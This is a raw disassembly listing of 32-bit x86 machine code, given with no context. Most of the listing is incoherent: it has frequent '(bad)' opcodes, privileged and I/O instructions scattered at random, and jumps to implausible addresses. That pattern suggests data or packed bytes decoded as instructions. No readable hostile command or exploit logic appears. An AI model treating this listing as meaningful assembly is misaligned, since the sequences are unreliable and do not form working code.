  40f4dd:	shl    BYTE PTR [ebp+0x66],0x8b
  40f4e1:	test   DWORD PTR [edi+edi*8],ebx
  40f4e4:	cs (bad) 
  40f4e6:	inc    DWORD PTR [ecx-0x75]
  40f4e9:	data16 in al,dx
  40f4eb:	test   DWORD PTR [eax],ecx
  40f4ed:	inc    DWORD PTR [eax]
  40f4ef:	inc    DWORD PTR [ecx-0x77]
  40f4f2:	mov    esi,DWORD PTR [edx-0x77]
  40f4f5:	call   FWORD PTR [eax]
  40f4f7:	leavew 
  40f4f9:	xchg   ebp,eax
  40f4fa:	inc    edi
  40f4fb:	push   DWORD PTR [ebp-0x1]
  40f4fe:	call   0xff50e048
  40f503:	lea    eax,[ebp-0x1]
  40f506:	mov    edi,edi
  40f508:	enter  0xc7,0xc3
  40f50c:	mov    eax,ecx
  40f50e:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  40f514:	sbb    al,0x8b
  40f516:	sbb    esp,edi
  40f518:	dec    ebp
  40f519:	mov    bh,0x8b
  40f51b:	mov    ah,cl
  40f51d:	mov    DWORD PTR [eax],0x8bc1ffc3
  40f523:	mov    eax,ebx
  40f525:	mov    BYTE PTR [eax],al
  40f527:	sar    bh,0x89
  40f52a:	sub    BYTE PTR [eax-0x77ff766c],cl
  40f530:	mov    esp,DWORD PTR [ebp+0x7c]
  40f533:	add    BYTE PTR [eax],al
  40f535:	inc    ebp
  40f536:	mov    esi,DWORD PTR ds:0xc7049c8d
  40f53c:	or     ah,bl
  40f53e:	add    BYTE PTR [ebp+0x458bf800],0x85
  40f545:	xor    DWORD PTR [edi],ecx
  40f547:	pushf  
  40f548:	js     0x40f511
  40f54a:	add    al,dh
  40f54c:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  40f552:	inc    eax
  40f553:	xor    eax,0x8b209f89
  40f558:	call   FWORD PTR [ebx+ecx*4]
  40f55b:	cmp    al,0x1
  40f55e:	mov    DWORD PTR [eax],0x8b8545c3
  40f564:	call   FWORD PTR [edi+edi*8]
  40f567:	dec    ebp
  40f568:	inc    ebp
  40f569:	mov    eax,DWORD PTR [ebx-0xffe374]
  40f56f:	mov    eax,DWORD PTR [eax]
  40f571:	mov    eax,edi
  40f573:	nop
  40f574:	ret    
  40f575:	add    BYTE PTR [ebp-0x130077],al
  40f57b:	jne    0x40f502
  40f57d:	test   edi,edi
  40f57f:	jne    0x40f580
  40f581:	dec    DWORD PTR [ebx-0x38aa1fe8]
  40f587:	call   0xffccf24f
  40f58c:	sbb    al,0x45
  40f58e:	stos   BYTE PTR es:[edi],al
  40f58f:	mov    eax,DWORD PTR [eax]
  40f591:	mov    edx,DWORD PTR [eax+0x3]
  40f594:	inc    ebp
  40f595:	cmp    al,0x8b
  40f597:	push   cs
  40f598:	cwde   
  40f599:	inc    ebp
  40f59a:	add    BYTE PTR [ebp-0xe78b39],al
  40f5a0:	call   FWORD PTR [esp+eax*1]
  40f5a3:	test   eax,0x8bffff00
  40f5a8:	mov    DWORD PTR [esp+eiz*4],ebx
  40f5ab:	adc    BYTE PTR [ebp+0x1],0x8b
  40f5af:	add    al,ch
  40f5b1:	add    al,dh
  40f5b3:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  40f5ba:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  40f5c0:	inc    ebp
  40f5c1:	add    DWORD PTR [ebx-0x7aceb000],ecx
  40f5c7:	cmp    bh,0x1
  40f5ca:	inc    DWORD PTR [eax]
  40f5cc:	inc    ebp
  40f5cd:	push   eax
  40f5ce:	xor    ebp,ecx
  40f5d0:	add    eax,DWORD PTR [edx]
  40f5d2:	mov    DWORD PTR [eax],eax
  40f5d4:	and    al,0x80
  40f5d6:	inc    DWORD PTR [ecx]
  40f5d8:	lea    eax,[eax]
  40f5da:	pushf  
  40f5db:	or     BYTE PTR [ebp-0xfe00bb],al
  40f5e1:	jmp    0x13ff86b
  40f5e6:	dec    DWORD PTR [esi]
  40f5e8:	mov    ecx,ecx
  40f5ea:	loopne 0x40f571
  40f5ec:	mov    DWORD PTR [edx],0x4d8b00c3
  40f5f2:	sbb    al,0x8b
  40f5f4:	out    dx,al
  40f5f5:	mov    eax,DWORD PTR [eax]
  40f5f7:	push   eax
  40f5f8:	push   eax
  40f5f9:	test   DWORD PTR [ebp-0x1],eax
  40f5fc:	mov    edi,edi
  40f5fe:	cwde   
  40f5ff:	inc    ebp
  40f600:	add    BYTE PTR [ebx],dh
  40f602:	mov    DWORD PTR [ebx],0x24ff8918
  40f608:	add    al,0xff
  40f60a:	add    BYTE PTR [ebx-0x5ae30f77],cl
  40f610:	(bad)  
  40f611:	(bad)  
  40f612:	(bad)  
  40f613:	(bad)  
  40f614:	push   DWORD PTR [ebx]
  40f616:	or     BYTE PTR [ebx],al
  40f618:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  40f61f:	(bad)  
  40f620:	cld    
  40f621:	sbb    BYTE PTR [ebx+0x765050ff],al
  40f627:	inc    ebp
  40f628:	mov    esi,DWORD PTR [ebx]
  40f62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62b:	add    ecx,esi
  40f62d:	push   eax
  40f62e:	mov    BYTE PTR [ebp+0x4d],0x5
  40f632:	jmp    0x40f634
  40f634:	mov    eax,DWORD PTR [eax]
  40f636:	clc    
  40f637:	mov    ecx,DWORD PTR [esp+ebx*1]
  40f63a:	inc    DWORD PTR [eax+0x5501fc]
  40f640:	mov    BYTE PTR [ebp-0xe70075],al
  40f646:	cmp    eax,DWORD PTR [eax]
  40f648:	push   eax
  40f649:	add    cl,ch
  40f64b:	xor    BYTE PTR [esi+0x4d],cl
  40f64e:	add    edi,edi
  40f650:	mov    ecx,DWORD PTR [eax]
  40f652:	mov    al,ds:0x8b8b004d
  40f657:	mov    ebp,DWORD PTR [ebx]
  40f659:	hlt    
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	add    dh,al
  40f65d:	add    DWORD PTR [ebp+0x45],edx
  40f660:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  40f666:	dec    ebp
  40f667:	inc    eax
  40f668:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  40f66e:	add    BYTE PTR [ebx-0x38162400],cl
  40f674:	add    bl,al
  40f676:	add    BYTE PTR [ebp-0x2e003e],al
  40f67c:	mov    DWORD PTR [ebp-0x10],eax
  40f67f:	mov    DWORD PTR [ebp+0x28],esp
  40f682:	push   eax
  40f683:	dec    DWORD PTR [ecx+0x5518e88d]
  40f689:	dec    DWORD PTR [ecx+0x5545f050]
  40f68f:	xor    ecx,DWORD PTR [edi]
  40f691:	add    edx,DWORD PTR [edx]
  40f693:	push   eax
  40f694:	xchg   ebp,eax
  40f695:	inc    ebp
  40f696:	inc    DWORD PTR ds:0xe200ff
  40f69c:	jnp    0x809612a2
  40f6a2:	mov    eax,DWORD PTR [ecx]
  40f6a4:	pusha  
  40f6a5:	add    bh,bh
  40f6a7:	test   ecx,eax
  40f6a9:	dec    DWORD PTR [edi+edi*8]
  40f6ac:	ret    0x8d00
  40f6af:	add    bh,bh
  40f6b1:	mov    ch,0xd7
  40f6b3:	(bad)  
  40f6b4:	cli    
  40f6b5:	inc    DWORD PTR [ebp+0x2255f830]
  40f6bb:	test   DWORD PTR [ebp+0x74],ecx
  40f6be:	add    ecx,DWORD PTR [ebx+0x65a01889]
  40f6c4:	or     BYTE PTR [eax],al
  40f6c6:	cmp    DWORD PTR [eax+0x74],edi
  40f6c9:	add    BYTE PTR [ebx+0x114dfc23],cl
  40f6cf:	sub    eax,DWORD PTR [eax]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x77]
  40f6d4:	mov    eax,edi
  40f6d6:	add    DWORD PTR [ebx],eax
  40f6d8:	inc    ebp
  40f6d9:	dec    ebp
  40f6da:	mov    ecx,DWORD PTR [edx+0x45450118]
  40f6e0:	add    cl,BYTE PTR [ebx+0x875fc4d]
  40f6e6:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e9:	inc    eax
  40f6ea:	push   ebp
  40f6eb:	push   ecx
  40f6ec:	mov    esi,DWORD PTR [edx-0x14]
  40f6ef:	mov    edx,DWORD PTR [ecx+0xce003c]
  40f6f5:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  40f6fc:	add    al,0x55
  40f6fe:	push   ebp
  40f6ff:	add    ecx,DWORD PTR [ecx-0x2d030777]
  40f705:	push   ecx
  40f706:	test   DWORD PTR [ebx],eax
  40f708:	dec    DWORD PTR [ecx+0x554518ff]
  40f70e:	mov    edi,eax
  40f710:	sbb    al,0xec
  40f712:	inc    DWORD PTR [eax]
  40f714:	mov    DWORD PTR [eax],0xff8318
  40f71a:	add    al,0x83
  40f71c:	add    al,bh
  40f71e:	mov    ebp,edx
  40f720:	push   eax
  40f721:	push   ebp
  40f722:	test   DWORD PTR [edi+edi*8-0x73],esi
  40f726:	dec    DWORD PTR [eax]
  40f728:	inc    ebp
  40f729:	push   ebp
  40f72a:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  40f730:	and    al,0x8b
  40f732:	(bad)  
  40f733:	call   0x89ddaec5
  40f738:	test   DWORD PTR [eax-0x1],esp
  40f73b:	(bad)  
  40f73c:	inc    DWORD PTR [ecx+0xffff85]
  40f742:	dec    DWORD PTR [ecx-0x6a1f5f75]
  40f748:	(bad)  
  40f749:	inc    ebx
  40f74b:	dec    DWORD PTR [ebx-0x117ee316]
  40f751:	arpl   WORD PTR [eax],ax
  40f753:	int    0x50
  40f755:	xor    eax,DWORD PTR [ebp-0x7f]
  40f758:	mov    esi,DWORD PTR [eax]
  40f75a:	cwde   
  40f75b:	pushf  
  40f75c:	add    BYTE PTR [ebp-0x1],dh
  40f75f:	mov    edi,edi
  40f761:	mov    al,ds:0x4d45ce08
  40f766:	inc    DWORD PTR [ebx]
  40f768:	adc    al,0x83
  40f76a:	add    BYTE PTR [eax],0x1
  40f76d:	adc    BYTE PTR [eax],al
  40f76f:	push   ebp
  40f770:	inc    ebp
  40f771:	add    edi,edi
  40f773:	mov    edx,DWORD PTR [eax]
  40f775:	mov    ecx,DWORD PTR [ebp-0x60]
  40f778:	push   esi
  40f779:	adc    al,0x8
  40f77b:	mov    edx,DWORD PTR [ebp-0x8]
  40f77e:	mov    ecx,DWORD PTR [ebp-0x4]
  40f781:	add    DWORD PTR [ebp-0x18],0xffffff8d
  40f785:	inc    DWORD PTR [eax+esi*8]
  40f788:	inc    ebp
  40f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78a:	mov    edx,DWORD PTR [ebp+0x1c]
  40f78d:	add    DWORD PTR [ebp-0x14],eax
  40f790:	mov    edx,DWORD PTR [ebp-0x70]
  40f793:	cmp    eax,DWORD PTR [eax]
  40f795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f796:	mov    eax,DWORD PTR [eax]
  40f798:	sbb    al,0x73
  40f79a:	add    BYTE PTR [ebx],0x1
  40f79d:	hlt    
  40f79e:	add    BYTE PTR [eax+0x30],dl
  40f7a1:	mov    DWORD PTR [ecx],esi
  40f7a3:	hlt    
  40f7a4:	pop    ds
  40f7a5:	inc    ebp
  40f7a6:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  40f7ac:	(bad)  
  40f7ad:	push   DWORD PTR [edi]
  40f7af:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  40f7b5:	push   DWORD PTR [ebx-0x1]
  40f7b8:	mov    eax,DWORD PTR [ebp-0x740075]
  40f7be:	sub    eax,DWORD PTR [eax]
  40f7c0:	add    eax,DWORD PTR [eax]
  40f7c2:	mov    DWORD PTR [ecx+0x5f],eax
  40f7c5:	mov    DWORD PTR [ebx+0x20],ebx
  40f7c8:	ret    0xff
  40f7cb:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  40f7d1:	ret    
  40f7d2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f7d8:	add    BYTE PTR [ebp-0x7d],al
  40f7db:	mov    DWORD PTR [eax],eax
  40f7dd:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  40f7e4:	sar    bh,cl
  40f7e6:	test   BYTE PTR [eax+0x1],dl
  40f7e9:	inc    ebp
  40f7ea:	add    BYTE PTR [ebx],dh
  40f7ec:	test   BYTE PTR [ebx],0x84
  40f7ef:	push   eax
  40f7f0:	add    BYTE PTR [ebp+0x0],al
  40f7f3:	add    eax,0x86
  40f7f8:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f7fe:	add    BYTE PTR [ecx],al
  40f800:	add    BYTE PTR [eax],al
  40f802:	mov    esi,0x550030
  40f807:	mov    ecx,DWORD PTR [edi]
  40f809:	sbb    al,0xda
  40f80b:	jne    0x40f80d
  40f80d:	mov    edi,DWORD PTR [ecx]
  40f80f:	xor    BYTE PTR [eax+eax*1],0x84
  40f813:	add    eax,DWORD PTR [eax]
  40f815:	cld    
  40f816:	add    BYTE PTR [ebp-0x4f],dh
  40f819:	mov    eax,DWORD PTR [ecx]
  40f81b:	cld    
  40f81c:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f822:	retf   0xe45
  40f825:	add    eax,edx
  40f827:	sbb    al,0xb7
  40f829:	dec    ebp
  40f82a:	or     al,0x89
  40f82c:	dec    ebp
  40f82d:	sbb    al,0xf
  40f82f:	inc    ebp
  40f830:	dec    eax
  40f831:	mov    eax,DWORD PTR [ebx]
  40f833:	sbb    al,0xf
  40f835:	nop
  40f836:	scas   al,BYTE PTR es:[edi]
  40f837:	add    DWORD PTR [eax],eax
  40f839:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f83f:	mov    eax,gs
  40f841:	add    bh,bh
  40f843:	mov    edi,edi
  40f845:	cmp    DWORD PTR [edi+0x72],edx
  40f848:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f84e:	gs cmp al,0x0
  40f851:	je     0x40f829
  40f853:	push   eax
  40f854:	sar    BYTE PTR [eax],1
  40f856:	mov    bh,0x3e
  40f858:	push   cs
  40f859:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f85f:	add    DWORD PTR [ecx+0x12],ebp
  40f862:	dec    edx
  40f863:	(bad)  
  40f864:	mov    eax,edx
  40f866:	in     al,dx
  40f867:	adc    DWORD PTR [ecx],esi
  40f869:	pop    esi
  40f86a:	inc    ecx
  40f86b:	leave  
  40f86c:	or     DWORD PTR [eax],ebx
  40f86e:	gs push ebp
  40f870:	add    ah,ch
  40f872:	into   
  40f873:	in     al,dx
  40f874:	enter  0xb756,0xf0
  40f878:	push   cs
  40f879:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f883:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f889:	jnp    0x74417d91
  40f88f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f895:	add    BYTE PTR [edi],cl
  40f897:	mov    edi,DWORD PTR [ecx-0x78]
  40f89a:	ltr    WORD PTR [ecx-0x7b]
  40f89e:	dec    DWORD PTR [edi]
  40f8a0:	clc    
  40f8a1:	out    0x45,eax
  40f8a3:	add    BYTE PTR [eax],cl
  40f8a5:	cmp    ebx,0xffffff8c
  40f8a8:	jge    0x40f8aa
  40f8aa:	jb     0x40f8bc
  40f8ac:	je     0x4ff92c
  40f8b2:	pop    edx
  40f8b3:	push   esi
  40f8b4:	mov    ecx,DWORD PTR [edi]
  40f8b6:	in     al,dx
  40f8b7:	rol    DWORD PTR [ebp+0x0],1
  40f8ba:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f8c1:	cmp    DWORD PTR [ecx],0xfffffff0
  40f8c4:	hlt    
  40f8c5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f8cb:	(bad)  
  40f8cd:	push   eax
  40f8ce:	jns    0xb840dd4c
  40f8d4:	lock push cs
  40f8d6:	ror    edx,0x3
  40f8d9:	test   BYTE PTR [ecx+0x5500e800],cl
  40f8df:	dec    eax
  40f8e0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f8e4:	(bad)  
  40f8e5:	mov    esi,0x7f33ff5f
  40f8ea:	inc    eax
  40f8eb:	test   DWORD PTR [edx],eax
  40f8ed:	je     0x40f8af
  40f8ef:	mov    ecx,ecx
  40f8f1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f8f5:	and    eax,DWORD PTR [eax+0xf0103]
  40f8fb:	jp     0x40f8e9
  40f8fd:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f901:	add    edx,DWORD PTR [edi+0x74]
  40f904:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f90a:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f910:	je     0x40f895
  40f912:	cmp    eax,edi
  40f914:	js     0x40f939
  40f916:	add    eax,0xeb0fc003
  40f91b:	jns    0x40f8a8
  40f91d:	vmread DWORD PTR [ecx+0x45],ebx
  40f921:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f927:	adc    al,0x8b
  40f929:	jge    0x40f93f
  40f92b:	mov    edi,DWORD PTR [eax-0x4]
  40f92e:	add    edi,DWORD PTR [edi]
  40f930:	or     bh,bh
  40f932:	push   ebp
  40f933:	push   es
  40f934:	mov    DWORD PTR [ebp-0x4],ebx
  40f937:	add    edi,esi
  40f939:	pop    es
  40f93a:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f940:	mov    DWORD PTR [esp+esi*8],ecx
  40f943:	inc    ebp
  40f944:	pop    ebp
  40f945:	xor    DWORD PTR [esi-0x4],0x3b
  40f949:	add    edx,DWORD PTR [ecx+edi*1]
  40f94c:	push   es
  40f94d:	clc    
  40f94e:	mov    bh,0xdb
  40f950:	jp     0x40f909
  40f952:	add    cl,BYTE PTR [esi]
  40f954:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f95a:	test   edi,edi
  40f95c:	je     0x40f952
  40f95e:	mov    eax,ecx
  40f960:	or     BYTE PTR [ebx],al
  40f962:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f968:	jbe    0x40f9dc
  40f96a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f970:	add    ecx,DWORD PTR [esi]
  40f972:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f978:	add    eax,DWORD PTR [ebx-0x287af783]
  40f97e:	je     0x40f9cd
  40f980:	mov    DWORD PTR [ecx],edi
  40f982:	mov    esi,eax
  40f984:	hlt    
  40f985:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f98c:	jb     0x40f94e
  40f98e:	jmp    0x40f97b
  40f990:	xor    esi,DWORD PTR [ebx]
  40f992:	pop    edi
  40f993:	pop    esi
  40f994:	pop    ebx
  40f995:	ret    
  40f996:	ret    0x8b
  40f999:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f99f:	xor    DWORD PTR ds:0x89339c0c,0x56
  40f9a6:	cld    
  40f9a7:	cmp    DWORD PTR [ebp+0xf],eax
  40f9aa:	xor    al,BYTE PTR [ebp-0x7474ff64]
  40f9b0:	cld    
  40f9b1:	or     al,0x4d
  40f9b3:	ret    
  40f9b4:	mov    edi,DWORD PTR [esi-0x4]
  40f9b7:	pop    eax
  40f9b8:	dec    ebp
  40f9b9:	jne    0x40f946
  40f9bb:	xor    edi,esp
  40f9bd:	inc    eax
  40f9be:	dec    ebp
  40f9bf:	jbe    0x40fa14
  40f9c1:	inc    eax
  40f9c2:	pop    ebp
  40f9c3:	add    edx,DWORD PTR [esi+0x8]
  40f9c6:	push   esi
  40f9c7:	dec    eax
  40f9c8:	push   ecx
  40f9c9:	mov    eax,edi
  40f9cb:	and    al,0xf0
  40f9cd:	jo     0x40f9ba
  40f9cf:	mov    eax,DWORD PTR [ebx]
  40f9d1:	sbb    BYTE PTR [ebp+0x4d],cl
  40f9d4:	mov    eax,DWORD PTR [ebx]
  40f9d6:	nop
  40f9d7:	or     BYTE PTR [eax],al
  40f9d9:	jne    0x40fa32
  40f9db:	cmp    ebx,DWORD PTR [ebp+0x33893277]
  40f9e1:	cld    
  40f9e2:	xor    edi,edi
  40f9e4:	add    edi,DWORD PTR [ebp+0x3]
  40f9e7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f9ed:	js     0x40f973
  40f9ef:	jae    0x40f9f3
  40f9f1:	(bad)  
  40f9f3:	xor    al,0x5d
  40f9f5:	jmp    0x40f982
  40f9f7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f9fe:	fdecstp 
  40fa00:	test   BYTE PTR [edi],ah
  40fa02:	add    bh,BYTE PTR [ebp+0x0]
  40fa05:	add    ebx,DWORD PTR [ebp-0x77]
  40fa08:	mov    edi,eax
  40fa0a:	cmp    al,0x0
  40fa0d:	adc    dh,BYTE PTR [ebx]
  40fa0f:	jge    0x40fa14
  40fa11:	mov    edi,DWORD PTR [ebx]
  40fa13:	jl     0x40fa24
  40fa15:	clc    
  40fa16:	dec    edi
  40fa17:	jge    0x40fa19
  40fa19:	mov    eax,DWORD PTR [ebx]
  40fa1b:	jb     0x40fa25
  40fa1d:	mov    ecx,DWORD PTR [ebp-0x8]
  40fa20:	mov    edi,edi
  40fa22:	xor    edx,DWORD PTR [eax]
  40fa24:	add    edi,DWORD PTR [ebx]
  40fa26:	mov    DWORD PTR [ebp-0x10],edi
  40fa29:	inc    edi
  40fa2a:	pop    ebp
  40fa2b:	jge    0x40fa68
  40fa2d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40fa31:	mov    edx,0xc05d87f0
  40fa36:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40fa3a:	fimul  WORD PTR [eax]
  40fa3c:	fist   WORD PTR [ebp+0x1c]
  40fa3f:	in     al,dx
  40fa40:	jne    0x40fa2e
  40fa42:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40fa48:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40fa4c:	fdivp  st(0),st
  40fa4e:	fild   WORD PTR [ebp+0x4510f85c]
  40fa54:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40fa5a:	inc    ebp
  40fa5b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40fa61:	mov    ebp,DWORD PTR [ebx-0x4]
  40fa64:	adc    al,0x8b
  40fa66:	rcl    DWORD PTR [eax],0x48
  40fa69:	mov    esi,0x7080803
  40fa6e:	fiadd  WORD PTR [ebp+0x4d]
  40fa71:	(bad)  
  40fa72:	mov    edx,DWORD PTR [edx-0x4]
  40fa75:	mov    edx,DWORD PTR [ebp-0x4]
  40fa78:	xor    ebx,DWORD PTR [ebx+0x330103]
  40fa7e:	mov    DWORD PTR [edi+0x872dc],edi
  40fa84:	xlat   BYTE PTR ds:[ebx]
  40fa85:	into   
  40fa86:	ffreep st(6)
  40fa88:	retf   0x6c7
  40fa8b:	iret   
  40fa8c:	dec    ebp
  40fa8d:	inc    ebp
  40fa8e:	mov    DWORD PTR [ebx],edi
  40fa90:	fmul   QWORD PTR [edi]
  40fa92:	dec    ebp
  40fa93:	jnp    0x40fac8
  40fa95:	add    BYTE PTR [ebx],al
  40fa97:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa9a:	inc    ebp
  40fa9b:	dec    ebp
  40fa9c:	lea    esi,[ebx]
  40fa9e:	add    DWORD PTR [ebx],eax
  40faa0:	jb     0x40fadd
  40faa2:	add    BYTE PTR [edi],cl
  40faa4:	inc    ebp
  40faa5:	imul   eax,edi,0x858bd800
  40faab:	cld    
  40faac:	clc    
  40faad:	mov    DWORD PTR [ebp+0x0],eax
  40fab0:	inc    DWORD PTR [eax]
  40fab2:	or     al,0xde
  40fab4:	sbb    bh,0x1
  40fab7:	retf   
  40fab8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40fabf:	dec    ebp
  40fac0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40fac6:	enter  0x12de,0xdf
  40faca:	inc    ebp
  40facb:	pop    ebp
  40facc:	dec    DWORD PTR [ebx-0x257f0ff4]
  40fad2:	add    DWORD PTR [edx],edx
  40fad4:	add    BYTE PTR [ebp+0x50],dl
  40fad7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40fadd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40fae3:	or     ah,al
  40fae5:	pop    ss
  40fae6:	cdq    
  40fae7:	push   ebp
  40fae8:	clc    
  40fae9:	mov    eax,DWORD PTR [ebp-0x4]
  40faec:	xor    edx,edx
  40faee:	add    esi,DWORD PTR [ebx]
  40faf0:	cmp    eax,DWORD PTR [ebx]
  40faf2:	hlt    
  40faf3:	cmp    DWORD PTR [ebx],esp
  40faf5:	or     al,BYTE PTR [ebp+0xf]
  40faf8:	mov    eax,DWORD PTR [edx]
  40fafa:	loopne 0x40fafc
  40fafc:	(bad)  
  40fafd:	mov    ecx,esi
  40faff:	cld    
  40fb00:	pushf  
  40fb01:	pop    ebp
  40fb02:	popf   
  40fb03:	mov    esi,DWORD PTR [edx]
  40fb05:	lock mov eax,eax
  40fb08:	adc    BYTE PTR [ebx],al
  40fb0a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40fb11:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40fb17:	dec    ebp
  40fb18:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40fb1e:	(bad)  
  40fb1f:	iret   
  40fb20:	inc    ebp
  40fb21:	(bad)  
  40fb22:	jne    0x40fb71
  40fb24:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40fb2a:	(bad)  
  40fb2b:	cmp    ebx,eax
  40fb2d:	je     0x40fab5
  40fb2f:	add    edi,edi
  40fb31:	or     bh,bh
  40fb33:	dec    ebp
  40fb34:	inc    ebp
  40fb35:	mov    esi,DWORD PTR [ebx]
  40fb37:	cld    
  40fb38:	add    ecx,esi
  40fb3a:	cmp    ecx,DWORD PTR [eax-0xc]
  40fb3d:	mov    edx,DWORD PTR [edi]
  40fb3f:	or     BYTE PTR [ebp-0x7c],al
  40fb42:	mov    ebx,DWORD PTR [ebp-0x7639cd18]
  40fb48:	test   BYTE PTR [ebx*4-0x76c1cdbb],cl
  40fb4f:	pushf  
  40fb50:	call   0x51eae0
  40fb55:	jne    0x40fb1e
  40fb57:	mov    ebp,esp
  40fb59:	fcomp  DWORD PTR [ebx]
  40fb5b:	add    BYTE PTR [ecx],al
  40fb5d:	inc    DWORD PTR [ebp-0x75]
  40fb60:	(bad)  
  40fb61:	cld    
  40fb62:	add    al,0xce
  40fb64:	mov    ecx,edi
  40fb66:	cld    
  40fb67:	inc    ebp
  40fb68:	fidivr WORD PTR [ebx]
  40fb6a:	fbstp  TBYTE PTR [ebp-0x3e]
  40fb6d:	mov    eax,DWORD PTR [eax]
  40fb6f:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fb75:	fadd   st,st(7)
  40fb77:	add    BYTE PTR [ebp-0x1],al
  40fb7a:	mov    ecx,DWORD PTR [esp+edi*8]
  40fb7d:	inc    ebp
  40fb7e:	mov    bh,0xc7
  40fb81:	loopne 0x40fbc8
  40fb83:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fb89:	sbb    dh,BYTE PTR [ebx]
  40fb8b:	pushf  
  40fb8c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fb92:	mov    eax,edi
  40fb94:	cwde   
  40fb95:	inc    ebp
  40fb96:	inc    ebp
  40fb97:	jne    0x40fb24
  40fb99:	mov    esp,esp
  40fb9b:	clc    
  40fb9c:	add    al,0x4d
  40fb9e:	mov    DWORD PTR [ebx],esi
  40fba0:	or     al,0x33
  40fba2:	inc    ebp
  40fba3:	lea    ecx,[ebx-0x398d13fd]
  40fba9:	add    bh,al
  40fbab:	inc    ebp
  40fbac:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fbb3:	add    ebp,esp
  40fbb5:	shufps xmm1,xmm3,0xc7
  40fbb9:	(bad)  
  40fbba:	jmp    0x748636e3
  40fbbf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fbc5:	hlt    
  40fbc6:	mov    ecx,DWORD PTR [edi]
  40fbc8:	fadd   DWORD PTR [ebp+0x0]
  40fbcb:	xor    ecx,DWORD PTR [edi]
  40fbcd:	add    ecx,ecx
  40fbcf:	cmp    edi,edi
  40fbd1:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fbd5:	(bad)  
  40fbd6:	jmp    0x40fb63
  40fbd8:	mov    edi,esp
  40fbda:	or     al,0xc6
  40fbdc:	inc    ebp
  40fbdd:	(bad)  
  40fbde:	mov    eax,DWORD PTR [ebp+0x10]
  40fbe1:	jne    0x40fb6c
  40fbe3:	mov    eax,DWORD PTR [ecx]
  40fbe5:	clc    
  40fbe6:	add    BYTE PTR [ebp-0x40],cl
  40fbe9:	xor    edx,DWORD PTR [eax-0x73]
  40fbec:	jne    0x40fbef
  40fbee:	push   DWORD PTR [edx+0x8]
  40fbf1:	add    BYTE PTR [ebp+0x45],al
  40fbf4:	mov    ebp,ecx
  40fbf6:	cld    
  40fbf7:	add    BYTE PTR [ebp+0x0],cl
  40fbfa:	xor    eax,DWORD PTR [ebp+0x3]
  40fbfd:	lea    edi,[ebx]
  40fbff:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40fc05:	sub    eax,0x5d330e4d
  40fc0a:	lea    esi,[ebx]
  40fc0c:	add    DWORD PTR [ebx],eax
  40fc0e:	jb     0x40fbf9
  40fc10:	add    BYTE PTR [eax],al
  40fc12:	inc    ebp
  40fc13:	add    bl,ch
  40fc15:	inc    ebp
  40fc16:	mov    esi,DWORD PTR [ebx]
  40fc18:	or     al,0x3
  40fc1a:	(bad)  
  40fc1b:	mov    edi,eax
  40fc1d:	in     al,dx
